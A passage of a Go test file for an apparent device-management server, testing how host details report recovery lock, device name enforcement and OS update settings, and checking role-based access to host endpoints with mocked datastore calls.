		failedStatus := automdm.MDMDeliveryFailed
		ds.GetHostRecoveryLockPasswordStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMRecoveryLockPassword, error) {
			result := &automdm.HostMDMRecoveryLockPassword{
				Detail: "SetRecoveryLock command failed",
			}
			result.SetRawStatus(&failedStatus, automdm.MDMOperationTypeInstall)
			return result, nil
		}

		ctx := license.NewContext(t.Context(), &automdm.LicenseInfo{Tier: automdm.TierPremium})
		hostDetail, err := svc.getHostDetails(test.UserContext(ctx, test.UserAdmin), &automdm.Host{ID: 42, Platform: "darwin", UUID: "test-uuid"}, automdm.HostDetailOptions{
			IncludeCVEScores: false,
			IncludePolicies:  false,
		})
		require.NoError(t, err)
		require.NotNil(t, hostDetail)
		require.True(t, ds.GetHostRecoveryLockPasswordStatusFuncInvoked)
		require.NotNil(t, hostDetail.MDM.OSSettings.RecoveryLockPassword.Status)
		assert.Equal(t, automdm.RecoveryLockStatusFailed, *hostDetail.MDM.OSSettings.RecoveryLockPassword.Status)
		assert.Equal(t, "SetRecoveryLock command failed", hostDetail.MDM.OSSettings.RecoveryLockPassword.Detail)
	})

	t.Run("recovery lock password status not called for non-macOS", func(t *testing.T) {
		ds.GetHostRecoveryLockPasswordStatusFuncInvoked = false
		ds.GetHostRecoveryLockPasswordStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMRecoveryLockPassword, error) {
			return nil, nil
		}
		ds.GetMDMWindowsBitLockerStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostMDMDiskEncryption, error) {
			return nil, nil
		}
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{MDM: automdm.MDM{WindowsEnabledAndConfigured: true}}, nil
		}

		ctx := license.NewContext(t.Context(), &automdm.LicenseInfo{Tier: automdm.TierPremium})
		hostDetail, err := svc.getHostDetails(test.UserContext(ctx, test.UserAdmin), &automdm.Host{ID: 42, Platform: "windows", UUID: "test-uuid"}, automdm.HostDetailOptions{
			IncludeCVEScores: false,
			IncludePolicies:  false,
		})
		require.NoError(t, err)
		require.NotNil(t, hostDetail)
		require.False(t, ds.GetHostRecoveryLockPasswordStatusFuncInvoked)
	})
}

func TestHostDetailsHostNameStatus(t *testing.T) {
	ds := new(mock.Store)
	ds.IsHostConnectedToAutoMDMMDMFunc = func(ctx context.Context, host *automdm.Host) (bool, error) {
		return true, nil
	}
	ds.ListAppleProfilesForReconcileByTeamFunc = func(ctx context.Context, teamID uint) ([]*automdm.AppleProfileForReconcile, error) {
		return nil, nil
	}
	ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (automdm.DiskEncryptionConfig, error) {
		return automdm.DiskEncryptionConfig{}, nil
	}
	svc := &Service{ds: ds}

	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*automdm.Label, error) { return nil, nil }
	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, includeCVEScores bool) error { return nil }
	ds.LoadHostMDMAppleDeviceVitalsFunc = func(ctx context.Context, host *automdm.Host) error { return nil }
	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *automdm.Host) ([]*automdm.HostPolicy, error) { return nil, nil }
	ds.ListHostBatteriesFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostBattery, error) { return nil, nil }
	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*automdm.HostMaintenanceWindow, error) {
		return nil, nil
	}
	ds.GetHostMDMMacOSSetupFunc = func(ctx context.Context, hid uint) (*automdm.HostMDMMacOSSetup, error) { return nil, nil }
	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true}}, nil
	}
	ds.GetHostMDMAppleProfilesFunc = func(ctx context.Context, uuid string) ([]automdm.HostMDMAppleProfile, error) { return nil, nil }
	ds.GetHostMDMWindowsProfilesFunc = func(ctx context.Context, uuid string) ([]automdm.HostMDMWindowsProfile, error) { return nil, nil }
	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
		return &automdm.HostLockWipeStatus{}, nil
	}
	ds.GetHostMDMFunc = func(ctx context.Context, hostID uint) (*automdm.HostMDM, error) {
		return &automdm.HostMDM{Enrolled: true, IsServer: false}, nil
	}
	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) { return nil, nil }
	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*automdm.HostDeviceMapping, error) { return nil, nil }
	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) { return nil, nil }
	ds.GetHostGoogleDeviceIDFunc = func(ctx context.Context, hostUUID, customerID string) (string, error) { return "", nil }
	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]automdm.HostCustomHostVital, error) {
		return nil, nil
	}
	ds.GetHostPatchDeadlineAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) { return false, nil }
	ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*automdm.NanoMDMEnrollmentDetails, error) {
		return &automdm.NanoMDMEnrollmentDetails{}, nil
	}
	ds.GetHostRecoveryLockPasswordStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMRecoveryLockPassword, error) {
		return nil, nil
	}
	ds.GetHostManagedLocalAccountStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMManagedLocalAccount, error) {
		return nil, nil
	}

	getDetails := func(t *testing.T, platform string) *automdm.HostDetail {
		ctx := license.NewContext(t.Context(), &automdm.LicenseInfo{Tier: automdm.TierPremium})
		hostDetail, err := svc.getHostDetails(test.UserContext(ctx, test.UserAdmin),
			&automdm.Host{ID: 42, Platform: platform, UUID: "test-uuid"},
			automdm.HostDetailOptions{})
		require.NoError(t, err)
		require.NotNil(t, hostDetail)
		return hostDetail
	}

	// Each of the four statuses surfaces, and a NULL (queued) row renders pending.
	statusCases := []struct {
		name   string
		dbRow  *automdm.HostDeviceNameEnforcement
		expect automdm.HostNameSettingStatus
		detail string
	}{
		{"queued NULL renders pending", &automdm.HostDeviceNameEnforcement{HostUUID: "test-uuid", Status: nil}, automdm.HostNameSettingPending, ""},
		{"pending", &automdm.HostDeviceNameEnforcement{HostUUID: "test-uuid", Status: new(automdm.MDMDeliveryPending)}, automdm.HostNameSettingPending, ""},
		{"verifying", &automdm.HostDeviceNameEnforcement{HostUUID: "test-uuid", Status: new(automdm.MDMDeliveryVerifying)}, automdm.HostNameSettingVerifying, ""},
		{"verified", &automdm.HostDeviceNameEnforcement{HostUUID: "test-uuid", Status: new(automdm.MDMDeliveryVerified)}, automdm.HostNameSettingVerified, ""},
		{"failed with detail", &automdm.HostDeviceNameEnforcement{HostUUID: "test-uuid", Status: new(automdm.MDMDeliveryFailed), Detail: "boom"}, automdm.HostNameSettingFailed, "boom"},
	}
	for _, tc := range statusCases {
		for _, platform := range []string{"darwin", "ios", "ipados"} {
			t.Run(tc.name+"/"+platform, func(t *testing.T) {
				ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*automdm.HostDeviceNameEnforcement, error) {
					return tc.dbRow, nil
				}
				hd := getDetails(t, platform)
				require.NotNil(t, hd.MDM.OSSettings.HostName, "host_name must be present for eligible host")
				require.Equal(t, tc.expect, hd.MDM.OSSettings.HostName.Status)
				require.Equal(t, tc.detail, hd.MDM.OSSettings.HostName.Detail)
			})
		}
	}

	t.Run("omitted when the host has no enforcement row", func(t *testing.T) {
		ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*automdm.HostDeviceNameEnforcement, error) {
			return nil, newNotFoundError()
		}
		hd := getDetails(t, "darwin")
		require.Nil(t, hd.MDM.OSSettings.HostName, "host_name must be omitted for an ineligible host")
	})

	t.Run("not queried for non-Apple platforms", func(t *testing.T) {
		ds.GetHostDeviceNameEnforcementFuncInvoked = false
		ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*automdm.HostDeviceNameEnforcement, error) {
			return nil, nil
		}
		ds.GetMDMWindowsBitLockerStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostMDMDiskEncryption, error) {
			return nil, nil
		}
		hd := getDetails(t, "windows")
		require.False(t, ds.GetHostDeviceNameEnforcementFuncInvoked)
		require.Nil(t, hd.MDM.OSSettings.HostName)
	})

	t.Run("not queried when MDM is not configured", func(t *testing.T) {
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: false}}, nil
		}
		ds.GetHostDeviceNameEnforcementFuncInvoked = false
		ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*automdm.HostDeviceNameEnforcement, error) {
			return &automdm.HostDeviceNameEnforcement{HostUUID: hostUUID}, nil
		}

		ctx := license.NewContext(t.Context(), &automdm.LicenseInfo{Tier: automdm.TierPremium})
		hd, err := svc.getHostDetails(test.UserContext(ctx, test.UserAdmin),
			&automdm.Host{ID: 42, Platform: "darwin", UUID: "test-uuid"}, automdm.HostDetailOptions{})
		require.NoError(t, err)
		require.False(t, ds.GetHostDeviceNameEnforcementFuncInvoked, "must not query enforcement when MDM is off")
		require.Nil(t, hd.MDM.OSSettings) // OS settings are only assembled when MDM is configured
	})

	t.Run("non-not-found datastore error propagates", func(t *testing.T) {
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true}}, nil
		}
		ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*automdm.HostDeviceNameEnforcement, error) {
			return nil, errors.New("db exploded")
		}

		ctx := license.NewContext(t.Context(), &automdm.LicenseInfo{Tier: automdm.TierPremium})
		_, err := svc.getHostDetails(test.UserContext(ctx, test.UserAdmin),
			&automdm.Host{ID: 42, Platform: "darwin", UUID: "test-uuid"}, automdm.HostDetailOptions{})
		require.Error(t, err)
		require.Contains(t, err.Error(), "db exploded")
	})
}

func TestHostDetailsOSUpdates(t *testing.T) {
	ds := new(mock.Store)
	ds.IsHostConnectedToAutoMDMMDMFunc = func(ctx context.Context, host *automdm.Host) (bool, error) {
		return true, nil
	}
	ds.ListAppleProfilesForReconcileByTeamFunc = func(ctx context.Context, teamID uint) ([]*automdm.AppleProfileForReconcile, error) {
		return nil, nil
	}
	ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (automdm.DiskEncryptionConfig, error) {
		return automdm.DiskEncryptionConfig{}, nil
	}
	svc := &Service{ds: ds}

	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*automdm.Label, error) { return nil, nil }
	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, includeCVEScores bool) error { return nil }
	ds.LoadHostMDMAppleDeviceVitalsFunc = func(ctx context.Context, host *automdm.Host) error { return nil }
	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *automdm.Host) ([]*automdm.HostPolicy, error) { return nil, nil }
	ds.ListHostBatteriesFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostBattery, error) { return nil, nil }
	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*automdm.HostMaintenanceWindow, error) {
		return nil, nil
	}
	ds.GetHostMDMMacOSSetupFunc = func(ctx context.Context, hid uint) (*automdm.HostMDMMacOSSetup, error) { return nil, nil }
	ds.GetHostMDMAppleProfilesFunc = func(ctx context.Context, uuid string) ([]automdm.HostMDMAppleProfile, error) { return nil, nil }
	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
		return &automdm.HostLockWipeStatus{}, nil
	}
	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) { return nil, nil }
	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*automdm.HostDeviceMapping, error) { return nil, nil }
	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) { return nil, nil }
	ds.GetHostGoogleDeviceIDFunc = func(ctx context.Context, hostUUID, customerID string) (string, error) { return "", nil }
	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]automdm.HostCustomHostVital, error) {
		return nil, nil
	}
	ds.GetHostPatchDeadlineAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) { return false, nil }
	ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*automdm.NanoMDMEnrollmentDetails, error) {
		return &automdm.NanoMDMEnrollmentDetails{}, nil
	}
	ds.GetHostRecoveryLockPasswordStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMRecoveryLockPassword, error) {
		return nil, nil
	}
	ds.GetHostManagedLocalAccountStatusFunc = func(ctx context.Context, hostUUID string) (*automdm.HostMDMManagedLocalAccount, error) {
		return nil, nil
	}
	ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*automdm.HostDeviceNameEnforcement, error) {
		return nil, nil
	}

	// enforceVersion builds settings pinned to a specific minimum version, the
	// mode where the config itself carries the target and deadline.
	enforceVersion := func(minimumVersion, deadline string) automdm.AppleOSUpdateSettings {
		return automdm.AppleOSUpdateSettings{
			MinimumVersion: optjson.SetString(minimumVersion),
			Deadline:       optjson.SetString(deadline),
		}
	}
	// enforceLatest builds "latest" settings, where the target version and
	// deadline are resolved per host.
	enforceLatest := func(deadlineDays int) automdm.AppleOSUpdateSettings {
		return automdm.AppleOSUpdateSettings{
			MinimumVersion: optjson.SetString(automdm.AppleOSUpdateLatestVersion),
			DeadlineDays:   optjson.SetInt(deadlineDays),
		}
	}
	deadline := time.Date(2026, 9, 15, 0, 0, 0, 0, time.UTC)

	cases := []struct {
		name string
		// mdm is the app config MDM settings; teamMDM, when non-nil, is what
		// TeamLite reports for the host's team and must win over mdm.
		mdm          automdm.MDM
		teamMDM      *automdm.TeamMDM
		platform     string
		osUpdateHost *automdm.AppleSoftwareUpdateHost
		// wantOSUpdateHostQueried asserts whether the per-host resolved row was
		// looked up, which only happens in "latest" mode.
		wantOSUpdateHostQueried bool
		wantMinimumVersion      *string
		wantDeadline            *string
	}{
		{
			name:     "not configured",
			mdm:      automdm.MDM{EnabledAndConfigured: true},
			platform: "darwin",
		},
		{
			name: "macOS specific version from app config",
			mdm: automdm.MDM{
				EnabledAndConfigured: true,
				MacOSUpdates:         enforceVersion("15.6.1", "2026-09-15"),
			},
			platform:           "darwin",
			wantMinimumVersion: new("15.6.1"),
			wantDeadline:       new("2026-09-15"),
		},
		{
			name: "iOS host reads the iOS settings",
			mdm: automdm.MDM{
				EnabledAndConfigured: true,
				MacOSUpdates:         enforceVersion("15.6.1", "2026-09-15"),
				IOSUpdates:           enforceVersion("18.7", "2026-10-01"),
				IPadOSUpdates:        enforceVersion("18.6", "2026-11-01"),
			},
			platform:           "ios",
			wantMinimumVersion: new("18.7"),
			wantDeadline:       new("2026-10-01"),
		},
		{
			name: "iPadOS host reads the iPadOS settings",
			mdm: automdm.MDM{
				EnabledAndConfigured: true,
				MacOSUpdates:         enforceVersion("15.6.1", "2026-09-15"),
				IOSUpdates:           enforceVersion("18.7", "2026-10-01"),
				IPadOSUpdates:        enforceVersion("18.6", "2026-11-01"),
			},
			platform:           "ipados",
			wantMinimumVersion: new("18.6"),
			wantDeadline:       new("2026-11-01"),
		},
		{
			name: "non-Apple platform never reports OS updates",
			mdm: automdm.MDM{
				EnabledAndConfigured: true,
				MacOSUpdates:         enforceVersion("15.6.1", "2026-09-15"),
			},
			platform: "windows",
		},
		{
			name: "latest with a resolved target",
			mdm: automdm.MDM{
				EnabledAndConfigured: true,
				MacOSUpdates:         enforceLatest(14),
			},
			platform: "darwin",
			osUpdateHost: &automdm.AppleSoftwareUpdateHost{
				HostUUID:        "test-uuid",
				TargetOSVersion: "26.1",
				TargetDeadline:  &deadline,
			},
			wantOSUpdateHostQueried: true,
			wantMinimumVersion:      new("26.1"),
			wantDeadline:            new("2026-09-15"),
		},
		{
			name: "latest with no row yet",
			mdm: automdm.MDM{
				EnabledAndConfigured: true,
				MacOSUpdates:         enforceLatest(14),
			},
			platform:                "darwin",
			wantOSUpdateHostQueried: true,
			wantMinimumVersion:      new("Pending"),
			wantDeadline:            new("Pending"),
		},
		{
			name: "team settings win over app config",
			mdm: automdm.MDM{
				EnabledAndConfigured: true,
				MacOSUpdates:         enforceVersion("15.6.1", "2026-09-15"),
			},
			teamMDM:            &automdm.TeamMDM{MacOSUpdates: enforceVersion("26.0.1", "2026-12-24")},
			platform:           "darwin",
			wantMinimumVersion: new("26.0.1"),
			wantDeadline:       new("2026-12-24"),
		},
		{
			name: "team without OS updates configured overrides a configured app config",
			mdm: automdm.MDM{
				EnabledAndConfigured: true,
				MacOSUpdates:         enforceVersion("15.6.1", "2026-09-15"),
			},
			teamMDM:  &automdm.TeamMDM{},
			platform: "darwin",
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
				return &automdm.AppConfig{MDM: c.mdm}, nil
			}
			ds.GetMDMWindowsBitLockerStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostMDMDiskEncryption, error) {
				return nil, nil
			}
			ds.TeamLiteFuncInvoked = false
			ds.TeamLiteFunc = func(ctx context.Context, id uint) (*automdm.TeamLite, error) {
				require.NotNil(t, c.teamMDM, "team config must not be loaded for a no-team host")
				return &automdm.TeamLite{ID: id, Config: automdm.TeamConfigLite{MDM: *c.teamMDM}}, nil
			}
			ds.GetAppleOSUpdateHostByUUIDFuncInvoked = false
			ds.GetAppleOSUpdateHostByUUIDFunc = func(ctx context.Context, hostUUID string) (*automdm.AppleSoftwareUpdateHost, error) {
				require.Equal(t, "test-uuid", hostUUID)
				return c.osUpdateHost, nil
			}

			host := &automdm.Host{ID: 42, Platform: c.platform, UUID: "test-uuid"}
			if c.teamMDM != nil {
				host.TeamID = new(uint(1))
			}

			ctx := license.NewContext(t.Context(), &automdm.LicenseInfo{Tier: automdm.TierPremium})
			hd, err := svc.getHostDetails(test.UserContext(ctx, test.UserAdmin), host, automdm.HostDetailOptions{})
			require.NoError(t, err)
			require.NotNil(t, hd)

			assert.Equal(t, c.teamMDM != nil, ds.TeamLiteFuncInvoked)
			assert.Equal(t, c.wantOSUpdateHostQueried, ds.GetAppleOSUpdateHostByUUIDFuncInvoked)
			assert.Equal(t, c.wantMinimumVersion, hd.OSUpdateMinimumVersion)
			assert.Equal(t, c.wantDeadline, hd.OSUpdateDeadline)
		})
	}

	t.Run("team lookup error propagates", func(t *testing.T) {
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true}}, nil
		}
		ds.TeamLiteFunc = func(ctx context.Context, id uint) (*automdm.TeamLite, error) {
			return nil, errors.New("no such team")
		}

		ctx := license.NewContext(t.Context(), &automdm.LicenseInfo{Tier: automdm.TierPremium})
		_, err := svc.getHostDetails(test.UserContext(ctx, test.UserAdmin),
			&automdm.Host{ID: 42, Platform: "darwin", UUID: "test-uuid", TeamID: new(uint(1))}, automdm.HostDetailOptions{})
		require.Error(t, err)
		require.Contains(t, err.Error(), "no such team")
	})

	t.Run("resolved OS update lookup error propagates", func(t *testing.T) {
		ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
			return &automdm.AppConfig{MDM: automdm.MDM{EnabledAndConfigured: true, MacOSUpdates: enforceLatest(14)}}, nil
		}
		ds.GetAppleOSUpdateHostByUUIDFunc = func(ctx context.Context, hostUUID string) (*automdm.AppleSoftwareUpdateHost, error) {
			return nil, errors.New("db exploded")
		}

		ctx := license.NewContext(t.Context(), &automdm.LicenseInfo{Tier: automdm.TierPremium})
		_, err := svc.getHostDetails(test.UserContext(ctx, test.UserAdmin),
			&automdm.Host{ID: 42, Platform: "darwin", UUID: "test-uuid"}, automdm.HostDetailOptions{})
		require.Error(t, err)
		require.Contains(t, err.Error(), "db exploded")
	})
}

// checkHostWriteAuthErr asserts the result of a host-mutation authorization
// check. A caller with no read visibility into the host at all must see a
// NotFound (masking existence), not a Forbidden that would confirm the host
// exists on some other team; a caller who CAN read the host (e.g. same-team,
// wrong role) still gets the normal Forbidden, since no new information is
// disclosed by it.
func checkHostWriteAuthErr(t *testing.T, shouldFail, expectNotFound bool, err error) {
	t.Helper()
	if shouldFail && expectNotFound {
		require.Error(t, err)
		assert.True(t, automdm.IsNotFound(err))
		return
	}
	checkAuthErr(t, shouldFail, err)
}

// Fragile test: This test is fragile because of the large reliance on Datastore mocks. Consider refactoring test/logic or removing the test. It may be slowing us down more than helping us.
func TestHostAuth(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	teamHost := &automdm.Host{TeamID: new(uint(1))}
	globalHost := &automdm.Host{}

	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{}, nil
	}

	ds.DeleteHostFunc = func(ctx context.Context, hid uint) error {
		return nil
	}
	ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
		if id == 1 {
			return teamHost, nil
		}
		return globalHost, nil
	}
	ds.HostFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
		if id == 1 {
			return teamHost, nil
		}
		return globalHost, nil
	}
	ds.HostByIdentifierFunc = func(ctx context.Context, identifier string) (*automdm.Host, error) {
		if identifier == "1" {
			return teamHost, nil
		}
		return globalHost, nil
	}
	ds.HostIDByIdentifierFunc = func(ctx context.Context, identifier string, opts automdm.HostIDByIdentifierOptions) (uint, error) {
		assert.Equal(t, automdm.HostIDByIdentifierOptions{MatchID: true}, opts, "host endpoints match the host ID but not the agent keys")
		if identifier == "1" || identifier == "team-host" {
			return 1, nil
		}
		return 2, nil
	}
	ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
		return nil, nil
	}
	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, includeCVEScores bool) error {
		return nil
	}
	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*automdm.Label, error) {
		return nil, nil
	}
	ds.AddHostsToTeamFunc = func(ctx context.Context, params *automdm.AddHostsToTeamParams) error {
		return nil
	}
	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *automdm.Host) ([]*automdm.HostPolicy, error) {
		return nil, nil
	}
	ds.ListHostBatteriesFunc = func(ctx context.Context, hostID uint) ([]*automdm.HostBattery, error) {
		return nil, nil
	}
	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*automdm.HostMaintenanceWindow, error) {
		return nil, nil
	}
	ds.DeleteHostsFunc = func(ctx context.Context, ids []uint) error {
		return nil
	}
	ds.UpdateHostRefetchRequestedFunc = func(ctx context.Context, id uint, value bool) error {
		if id == 1 {
			teamHost.RefetchRequested = true
		} else {
			globalHost.RefetchRequested = true
		}
		return nil
	}
	ds.BulkSetPendingMDMHostProfilesFunc = func(ctx context.Context, hids, tids []uint, puuids, uuids []string,
	) (updates automdm.MDMProfilesUpdates, err error) {
		return automdm.MDMProfilesUpdates{}, nil
	}
	ds.ListMDMAppleDEPSerialsInHostIDsFunc = func(ctx context.Context, hids []uint) ([]string, error) {
		return nil, nil
	}
	ds.TeamWithExtrasFunc = func(ctx context.Context, id uint) (*automdm.Team, error) {
		return &automdm.Team{ID: id}, nil
	}
	ds.TeamLiteFunc = func(ctx context.Context, id uint) (*automdm.TeamLite, error) {
		return &automdm.TeamLite{ID: id}, nil
	}
	ds.ListHostsLiteByIDsFunc = func(ctx context.Context, ids []uint) ([]*automdm.Host, error) {
		hosts := make([]*automdm.Host, 0, len(ids))
		for _, id := range ids {
			if id == 1 {
				hosts = append(hosts, &automdm.Host{ID: id, TeamID: teamHost.TeamID})
				continue
			}
			hosts = append(hosts, &automdm.Host{ID: id})
		}
		return hosts, nil
	}
	ds.SetOrUpdateCustomHostDeviceMappingFunc = func(ctx context.Context, hostID uint, email, source string) ([]*automdm.HostDeviceMapping, error) {
		return nil, nil
	}
	ds.ListHostUpcomingActivitiesFunc = func(ctx context.Context, hostID uint, opt automdm.ListOptions) ([]*automdm.UpcomingActivity, *automdm.PaginationMetadata, error) {
		return nil, nil, nil
	}
	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *automdm.Host) (*automdm.HostLockWipeStatus, error) {
		return &automdm.HostLockWipeStatus{}, nil
	}
	ds.ListHostSoftwareFunc = func(ctx context.Context, host *automdm.Host, opts automdm.HostSoftwareTitleListOptions) ([]*automdm.HostSoftwareWithInstaller, *automdm.PaginationMetadata, error) {
		return nil, nil, nil
	}
	ds.IsHostConnectedToAutoMDMMDMFunc = func(ctx context.Context, host *automdm.Host) (bool, error) {
		return true, nil
	}
	ds.ListHostCertificatesFunc = func(ctx context.Context, hostID uint, opts automdm.ListOptions) ([]*automdm.HostCertificateRecord, *automdm.PaginationMetadata, error) {
		return nil, nil, nil
	}
	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*automdm.ScimUser, error) {
		return nil, nil
	}
	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*automdm.HostDeviceMapping, error) {
		return nil, nil
	}
	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]automdm.HostCustomHostVital, error) {
		return nil, nil
	}
	ds.GetHostPatchDeadlineAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
		return nil, nil
	}
	ds.GetCategoriesForSoftwareTitlesFunc = func(ctx context.Context, softwareTitleIDs []uint, team_id *uint) (map[uint][]string, error) {
		return map[uint][]string{}, nil
	}
	ds.UpdateHostIssuesFailingPoliciesFunc = func(ctx context.Context, hostIDs []uint) error {
		return nil
	}
	ds.UpdateHostIssuesFailingPoliciesForSingleHostFunc = func(ctx context.Context, hostID uint) error {
		return nil
	}
	ds.GetHostIssuesLastUpdatedFunc = func(ctx context.Context, hostId uint) (time.Time, error) {
		return time.Time{}, nil
	}
	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
		return false, nil
	}
	ds.ListMDMAndroidUUIDsToHostIDsFunc = func(ctx context.Context, hostIDs []uint) (map[string]uint, error) {
		return map[string]uint{}, nil
	}

	testCases := []struct {
		name                  string
		user                  *automdm.User
		shouldFailGlobalWrite bool
		shouldFailGlobalRead  bool
		shouldFailTeamWrite   bool
		shouldFailTeamRead    bool
	}{
		{
			"global admin",
			&automdm.User{GlobalRole: new(automdm.RoleAdmin)},
			false,
			false,
			false,
			false,
		},
		{
			"global maintainer",
			&automdm.User{GlobalRole: new(automdm.RoleMaintainer)},
			false,
			false,
			false,
			false,
		},
		{
			"global observer",
			&automdm.User{GlobalRole: new(automdm.RoleObserver)},
			true,
			false,
			true,
			false,
		},
		{
			"team admin, belongs to team",
			&automdm.User{Teams: []automdm.UserTeam{{Team: automdm.Team{ID: 1}, Role: automdm.RoleAdmin}}},
			true,
			true,
			false,
			false,
		},
		{
			"team maintainer, belongs to team",
			&automdm.User{Teams: []automdm.UserTeam{{Team: automdm.Team{ID: 1}, Role: automdm.RoleMaintainer}}},
			true,
			true,
			false,
			false,
		},
		{
			"team observer, belongs to team",
			&automdm.User{Teams: []automdm.UserTeam{{Team: automdm.Team{ID: 1}, Role: automdm.RoleObserver}}},
			true,
			true,
			true,
			false,
		},
		{
			"team admin, DOES NOT belong to team",
			&automdm.User{Teams: []automdm.UserTeam{{Team: automdm.Team{ID: 2}, Role: automdm.RoleAdmin}}},
			true,
			true,
			true,
			true,
		},
		{
			"team maintainer, DOES NOT belong to team",
			&automdm.User{Teams: []automdm.UserTeam{{Team: automdm.Team{ID: 2}, Role: automdm.RoleMaintainer}}},
			true,
			true,
			true,
			true,
		},
		{
			"team observer, DOES NOT belong to team",
			&automdm.User{Teams: []automdm.UserTeam{{Team: automdm.Team{ID: 2}, Role: automdm.RoleObserver}}},
			true,
			true,
			true,
			true,
		},
	}
	for _, tt := range testCases {
		t.Run(tt.name, func(t *testing.T) {
			ctx := viewer.NewContext(ctx, viewer.Viewer{User: tt.user})
			opts := automdm.HostDetailOptions{
				IncludeCVEScores: false,
				IncludePolicies:  false,
			}

			// A team-only role never has read visibility into a host outside
			// its own team(s) (including the team_id-less "global" host used
			// below): a write-authz failure in that case must surface as
			// NotFound rather than Forbidden, so it doesn't confirm the
			// host's existence to a caller with no view into it.
			isTeamOnlyRole := tt.user.GlobalRole == nil
			belongsToTeam1 := false
			for _, ut := range tt.user.Teams {
				if ut.Team.ID == 1 {
					belongsToTeam1 = true
				}
			}

			_, err := svc.GetHost(ctx, 1, opts)
			checkAuthErr(t, tt.shouldFailTeamRead, err)

			_, err = svc.GetHostLite(ctx, 1)
			checkAuthErr(t, tt.shouldFailTeamRead, err)

			for _, identifier := range []string{"1", "team-host"} {
				_, err = svc.GetHostByIDOrIdentifier(ctx, identifier, opts)
